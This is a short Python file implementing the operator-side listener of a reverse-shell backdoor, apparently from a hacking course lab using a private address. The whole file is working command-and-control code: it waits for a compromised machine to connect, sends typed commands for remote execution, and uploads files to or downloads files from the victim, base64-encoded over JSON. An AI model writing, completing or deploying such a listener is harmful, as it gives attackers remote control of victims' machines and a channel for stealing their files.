import socket, json, base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print(f"[+] Got a conneection from {address}")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())
    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download seccessful..."

    def file_read(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.file_read(command[1])
                    command.append(file_content.decode())

                result = self.execute_remotely(command)
                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution"
            print(result)

my_listener = Listener("10.0.2.4", 8080)
my_listener.run()